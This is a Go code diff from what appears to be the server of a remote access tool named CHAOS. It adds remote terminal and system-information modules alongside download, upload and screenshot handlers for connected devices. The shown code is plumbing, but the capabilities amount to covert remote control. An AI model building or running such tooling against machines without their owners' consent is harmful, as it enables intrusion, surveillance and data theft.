@@ -7,14 +7,16 @@ import (
 	log "github.com/sirupsen/logrus"
 	"github.com/tiagorlampert/CHAOS/internal/handler"
 	"github.com/tiagorlampert/CHAOS/internal/handler/client"
+	"github.com/tiagorlampert/CHAOS/internal/models"
 	"github.com/tiagorlampert/CHAOS/internal/usecase"
 	"github.com/tiagorlampert/CHAOS/internal/usecase/download"
+	"github.com/tiagorlampert/CHAOS/internal/usecase/information"
 	"github.com/tiagorlampert/CHAOS/internal/usecase/screenshot"
+	"github.com/tiagorlampert/CHAOS/internal/usecase/terminal"
 	"github.com/tiagorlampert/CHAOS/internal/usecase/upload"
 	"github.com/tiagorlampert/CHAOS/internal/util/network"
 	"github.com/tiagorlampert/CHAOS/internal/util/ui/completer"
 	c "github.com/tiagorlampert/CHAOS/pkg/color"
-	"github.com/tiagorlampert/CHAOS/pkg/models"
 	"github.com/tiagorlampert/CHAOS/pkg/system"
 	"github.com/tiagorlampert/CHAOS/pkg/util"
 	"net"
@@ -64,7 +66,7 @@ func (server *ServerHandler) AcceptConnections() {
 
 		message, _ := network.Read(connection)
 		var device models.Device
-		if err := json.Unmarshal(message, &device); err != nil {
+		if err := json.Unmarshal(message.Data, &device); err != nil {
 			log.WithField("cause", err.Error()).Error("error decoding device")
 			return
 		}
@@ -143,14 +145,18 @@ func (server *ServerHandler) connect(v []string) {
 	defer device.Connection.Close()
 
 	// Use Case
+	terminalUseCase := terminal.NewTerminalUseCase(device.Connection)
+	informationUseCase := information.NewInformationUseCase(device.Connection)
 	downloadUseCase := download.NewDownloadUseCase(device.Connection)
 	uploadUseCase := upload.NewUploadUseCase(device.Connection)
 	screenshotUseCase := screenshot.NewScreenshotUseCase(device.Connection)
 
 	useCase := usecase.UseCase{
-		Download:   downloadUseCase,
-		Upload:     uploadUseCase,
-		Screenshot: screenshotUseCase,
+		Terminal:    terminalUseCase,
+		Information: informationUseCase,
+		Download:    downloadUseCase,
+		Upload:      uploadUseCase,
+		Screenshot:  screenshotUseCase,
 	}
 
 	client.NewClientHandler(device.Connection, &useCase).HandleConnection(device.Hostname, device.UserID)
